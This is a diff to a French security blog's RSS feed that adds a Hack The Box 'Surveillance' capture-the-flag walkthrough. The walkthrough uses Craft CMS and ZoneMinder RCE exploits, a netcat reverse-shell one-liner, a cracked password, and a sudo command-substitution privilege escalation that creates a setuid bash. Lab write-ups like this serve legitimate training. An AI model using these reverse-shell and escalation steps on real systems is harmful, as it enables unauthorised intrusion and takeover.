@@ -6,8 +6,147 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>fr</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 17 Apr 2024 22:14:41 -0500</lastBuildDate>
+        <lastBuildDate>Fri, 19 Apr 2024 15:48:38 -0500</lastBuildDate>
         <atom:link href="https://scorpiosec.com/fr/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB: Surveillance</title>
+            <link>https://scorpiosec.com/fr/posts/2024/04/htb-surveillance/</link>
+            <pubDate>Fri, 19 Apr 2024 15:48:38 -0500</pubDate>
+            
+            <guid>https://scorpiosec.com/fr/posts/2024/04/htb-surveillance/</guid>
+            <description>Platforme: Hack The Box Lien: Surveillance Niveau: Moyen OS: Linux Surveillance débute par la découverte d&amp;rsquo;une application web fonctionnant sur le port 80, où nous identifions la version du logiciel utilisé et utilisons le CVE-2023-41892 pour obtenir un accès initial. Grâce à une exploration plus poussée, nous trouvons une sauvegarde de base de données qui révèle le nom et le hash du mot de passe d&amp;rsquo;un utilisateur administrateur. Ces informations sont utilisées pour nous connecter au système par SSH, et nous découvrons un service en interne.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platforme: Hack The Box</li>
+<li>Lien: <a href="https://app.hackthebox.com/machines/Surveillance" target="_blank" >Surveillance</a>
+
+</li>
+<li>Niveau: Moyen</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>Surveillance débute par la découverte d&rsquo;une application web fonctionnant sur le port 80, où nous identifions la version du logiciel utilisé et utilisons le CVE-2023-41892 pour obtenir un accès initial. Grâce à une exploration plus poussée, nous trouvons une sauvegarde de base de données qui révèle le nom et le hash du mot de passe d&rsquo;un utilisateur administrateur. Ces informations sont utilisées pour nous connecter au système par SSH, et nous découvrons un service en interne. En utilisant la redirection de port, nous accédons au service et nous tirons parti du CVE-2023-26035 pour l&rsquo;exploiter. Finalement, en exploitant les vulnérabilités de certains scripts, nous élevons nos privilèges et obtenons l&rsquo;accès au compte root.</p>
+<p>Adresse IP cible - <code>10.10.11.245</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Surveillance 10.10.11.245
+</code></pre><p><strong>Résultats</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-14 12:04 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.245
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.044s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://surveillance.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.52 seconds
+</span></span></code></pre></div><p>Le scan révèle deux ports ouverts, 22 (SSH) et 80 (HTTP - nginx), nous sommes également redirigés vers <code>http://surveillance.htb/</code>.</p>
+<pre tabindex="0"><code>sudo echo &#34;10.10.11.245 surveillance.htb&#34; | sudo tee -a /etc/hosts
+</code></pre><h2 id="enumération">Enumération</h2>
+<p>Le site web présente une compagnie offrant des services de sécurité, mais il n&rsquo;offre aucune caractéristique exploitable.</p>
+<p><img src="/images/HTB-Surveillance/surveillance-website.png" alt="Surveillance website"></p>
+<p>Avec <code>Wappalyzer</code> nous constatons que le site utilise <code>Craft CMS</code>. En parcourant le code source, nous trouvons que la version utilisée est <code>4.4.14</code>.</p>
+<p><img src="/images/HTB-Surveillance/Wappalyzer.png" alt="Wappalyzer results"></p>
+<p><img src="/images/HTB-Surveillance/Craft-CMS-version.png" alt="Craft CMS version"></p>
+<p>La recherche de vulnérabilités conduit au <a href="https://www.exploit-db.com/exploits/51918" target="_blank" >CVE-2023-41892</a>
+
+ qui permet l&rsquo;exécution de code à distance sans authentification. Un PoC est disponible <a href="https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce" target="_blank" >ici</a>
+
+.</p>
+<blockquote>
+<p>D&rsquo;après mon expérience, le PoC ci-dessus ne fonctionne pas toujours correctement, si cela vous arrive, utilisez <a href="https://github.com/Faelian/CraftCMS_CVE-2023-41892" target="_blank" >celui-ci</a>
+
+.</p>
+</blockquote>
+<h2 id="accès-initial">Accès Initial</h2>
+<p>Après avoir exécuté le script, nous obtenons un shell.</p>
+<p><img src="/images/HTB-Surveillance/foothold.png" alt="Surveillance initial foothold"></p>
+<p>Il semble que nous ne soyons pas en mesure de l&rsquo;améliorer, alors redirigeons-le vers un écouteur netcat.</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>Exécutez la commande ci-dessous sur la cible (copiez-la entièrement et collez-la dans votre terminal)</p>
+<pre tabindex="0"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.4 4444 &gt;/tmp/f 
+/usr/bin/script -qc /bin/bash /dev/null
+</code></pre><p><img src="/images/HTB-Surveillance/revshell.png" alt="Reverse shell transfer"></p>
+<p>Nous sommes maintenant en mesure d&rsquo;améliorer le shell que nous obtenons par l&rsquo;intermédiaire de notre listener.</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+export TERM=xterm
+Ctrl + Z
+stty raw -echo; fg
+stty rows 38 columns 116
+</code></pre><p><img src="/images/HTB-Surveillance/new-shell.png" alt="New shell"></p>
+<p>Pour l&rsquo;énumération du système, nous utilisons <code>linpeas</code> et notons que <code>mysql</code> est en cours d&rsquo;exécution sur la cible.</p>
+<p><img src="/images/HTB-Surveillance/mysql.png" alt="MySQL service"></p>
+<p><img src="/images/HTB-Surveillance/mysql1.png" alt="MySQL version"></p>
+<p>Nous trouvons également des identifiants pour MySQL.</p>
+<p><img src="/images/HTB-Surveillance/Craft-db-pwd.png" alt="MySQL credentials"></p>
+<blockquote>
+<p>Après s&rsquo;être connecté à MySQL, nous trouvons une base de données <code>craftdb</code> et une table nommée <code>users</code>, mais nous ne pouvons pas déchiffrer les hashs qui s&rsquo;y trouvent.</p>
+</blockquote>
+<p>Une sauvegarde de la base de données se trouve sur la cible dans <code>/var/www/html/craft/storage/backups/</code>.</p>
+<p><img src="/images/HTB-Surveillance/files.png" alt="FIles found by linpeas"></p>
+<p>L&rsquo;archive est exfiltrée vers notre système, après l&rsquo;avoir décompressée, nous trouvons un hash pour l&rsquo;utilisateur <code>Matthew</code> qui est un administrateur.</p>
+<blockquote>
+<p>Si vous lancez <code>cat /etc/passwd</code> sur la cible, vous trouverez effectivement l&rsquo;utilisateur <code>matthew</code>.</p>
+</blockquote>
+<p><img src="/images/HTB-Surveillance/matthew.png" alt="matthew user"></p>
+<p>En utilisant <a href="https://crackstation.net/" target="_blank" >CrackStation</a>
+
+ nous confirmons qu&rsquo;il s&rsquo;agit d&rsquo;un hash sha256 et nous réussissons à le craquer pour récupérer le mot de passe <code>starcraft122490</code>.</p>
+<p><img src="/images/HTB-Surveillance/matthew-pwd.png" alt="matthew user password"></p>
+<p>Avec les identifiants <code>matthew:starcraft122490</code> nous nous connectons via SSH et obtenons le drapeau <code>user.txt</code>.</p>
+<p><img src="/images/HTB-Surveillance/user-flag.png" alt="user flag"></p>
+<h3 id="redirection-de-port">Redirection de port</h3>
+<p>En vérifiant les services fonctionnant sur la cible avec <code>ss -lntp</code>, nous trouvons un service sur le port <code>8080</code>.</p>
+<p><img src="/images/HTB-Surveillance/ss-cmd.png" alt="ss command"></p>
+<p>La redirection de port est ensuite utilisée pour accéder au service via un tunnel SSH.</p>
+<pre tabindex="0"><code>ssh -f -N -L 5555:127.0.0.1:8080 matthew@surveillance.htb
+</code></pre><blockquote>
+<p>La commande ci-dessus établit un tunnel entre notre machine et le serveur <code>surveillance.htb</code>.</p>
+</blockquote>
+<p>Nous accédons ensuite au service en visitant <code>localhost:5555</code>, et trouvons une instance <code>ZoneMinder</code>.</p>
+<p><img src="/images/HTB-Surveillance/ZoneMinder.png" alt="ZoneMinder instance"></p>
+<p>En recherchant <code>zoneminder exploit</code> nous trouvons un <a href="https://github.com/rvizx/CVE-2023-26035" target="_blank" >PoC</a>
+
+ pour le <a href="https://www.exploit-db.com/exploits/51902" target="_blank" >CVE-2023-26035</a>
+
+ qui conduit également à un RCE non authentifié.</p>
+<pre tabindex="0"><code>git clone https://github.com/rvizx/CVE-2023-26035
+cd CVE-2023-26035
+python3 exploit.py -t &lt;target_url&gt; -ip &lt;attacker-ip&gt; -p &lt;port&gt;
+</code></pre><p><img src="/images/HTB-Surveillance/ZM-exploit.png" alt="ZoneMinder RCE exploit"></p>
+<p>Sur notre listener, nous obtenons un autre shell sous le nom de <code>zoneminder</code>.</p>
+<p><img src="/images/HTB-Surveillance/ZM-shell.png" alt="ZoneMinder RCE shell"></p>
+<h2 id="elévation-de-privilèges">Elévation de Privilèges</h2>
+<p>En lançant <code>sudo -l</code>, nous constatons que l&rsquo;utilisateur <code>zoneminder</code> peut exécuter tout ce qui correspond au motif <code>/usr/bin/zm[a-zA-Z]*.pl</code> avec les privilèges <code>sudo</code> sans avoir à fournir de mot de passe. De plus, n&rsquo;importe quelle option peut être ajoutée aux commandes du fait du caractère générique <code>*</code>.</p>
+<p><img src="/images/HTB-Surveillance/sudo-l.png" alt="sudo -l command"></p>
+<p>Le script <code>zmupdate.pl</code> accepte des arguments tels que <code>--version</code> et <code>--user</code>, il peut donc potentiellement exécuter un fichier pour nous.</p>
+<p><img src="/images/HTB-Surveillance/zmupdate.png" alt="zmupdate script"></p>
+<pre tabindex="0"><code>echo &#39;cp /bin/bash /tmp/bash;chmod 4755 /tmp/bash&#39; &gt; /tmp/exploit.sh
+chmod +x /tmp/exploit.sh
+</code></pre><blockquote>
+<p>Lorsque le script <code>exploit.sh</code> sera exécuté, il créera une copie du binaire <code>bash</code> dans <code>/tmp</code> et définira ses permissions pour qu&rsquo;il puisse être exécuté avec des privilèges élevés (setuid).</p>
+</blockquote>
+<p>Avec la substitution de commande, nous exécutons notre script via le script <code>zmupdate.pl</code>.</p>
+<pre tabindex="0"><code>sudo /usr/bin/zmupdate.pl --version=1 --user=&#39;$(/tmp/exploit.sh)&#39;
+</code></pre><blockquote>
+<p>Lorsque la commande est exécutée, tout ce qui est inclus dans <code>$(...)</code> est traité comme une commande à exécuter par l&rsquo;interpréteur de commandes, et le résultat de cette commande remplace la substitution de commande. Dans ce cas, <code>/tmp/exploit.sh</code> est un script qui crée un binaire setuid pour <code>/bin/bash</code> dans le répertoire <code>/tmp</code>.</p>
+</blockquote>
+<p>Après avoir démarré une nouvelle instance de l&rsquo;interpréteur de commandes bash, nous accédons à l&rsquo;utilisateur root.</p>
+<pre tabindex="0"><code>/tmp/bash -p
+</code></pre><p><img src="/images/HTB-Surveillance/root-flag.png" alt="root flag"></p>
+<p>Ce défi était assez simple et montrait comment la redirection de port peut être utilisé à des fins d&rsquo;exploitation. Si vous souhaitez approfondir la question du tunneling, Hack The Box propose un excellent module sur le sujet <a href="https://academy.hackthebox.com/module/details/158" target="_blank" >ici</a>
+
+. Si vous souhaitez expérimenter différents outils de tunneling, vous pouvez consulter <a href="https://github.com/anderspitman/awesome-tunneling" target="_blank" >awesome-tunneling</a>
+
+.</p>
+]]></content>
+        </item>
         
         <item>
             <title>THM: Creative</title>
@@ -15,13 +154,13 @@
             <pubDate>Wed, 17 Apr 2024 22:14:41 -0500</pubDate>
             
             <guid>https://scorpiosec.com/fr/posts/2024/04/thm-creative/</guid>
-            <description>Platform: TryHackMe Link: Creative Level: Easy OS: Linux Ce défi commence par un site web statique qui n&amp;rsquo;est pas exploitable. L&amp;rsquo;énumération des sous-domaines permet de découvrir une application de test d&amp;rsquo;URL vulnérable au SSRF. Cependant, l&amp;rsquo;exploitation complète n&amp;rsquo;est possible qu&amp;rsquo;après la découverte d&amp;rsquo;un port exposé en interne. Cet accès permet de lire des fichiers sur le serveur, ce qui conduit à la récupération d&amp;rsquo;une clé privée SSH. Mais cela ne suffit pas pour établir un point d&amp;rsquo;ancrage.</description>
+            <description>Platforme: TryHackMe Lien: Creative Niveau: Facile OS: Linux Ce défi commence par un site web statique qui n&amp;rsquo;est pas exploitable. L&amp;rsquo;énumération des sous-domaines permet de découvrir une application de test d&amp;rsquo;URL vulnérable au SSRF. Cependant, l&amp;rsquo;exploitation complète n&amp;rsquo;est possible qu&amp;rsquo;après la découverte d&amp;rsquo;un port exposé en interne. Cet accès permet de lire des fichiers sur le serveur, ce qui conduit à la récupération d&amp;rsquo;une clé privée SSH. Mais cela ne suffit pas pour établir un point d&amp;rsquo;ancrage.</description>
             <content type="html"><![CDATA[<ul>
-<li>Platform: TryHackMe</li>
-<li>Link: <a href="https://tryhackme.com/r/room/creative" target="_blank" >Creative</a>
+<li>Platforme: TryHackMe</li>
+<li>Lien: <a href="https://tryhackme.com/r/room/creative" target="_blank" >Creative</a>
 
 </li>
-<li>Level: Easy</li>
+<li>Niveau: Facile</li>
 <li>OS: Linux</li>
 </ul>
 <hr>
@@ -29,7 +168,7 @@
 <p>Adresse IP cible - <code>10.10.119.61</code></p>
 <h2 id="scanning">Scanning</h2>
 <pre tabindex="0"><code>nmap -sC -sV -oA nmap/Creative 10.10.119.61
-</code></pre><p><strong>Results</strong></p>
+</code></pre><p><strong>Résultats</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-12 20:52 CDT
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.119.61
 </span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.27s latency<span style="color:#f92672">)</span>.
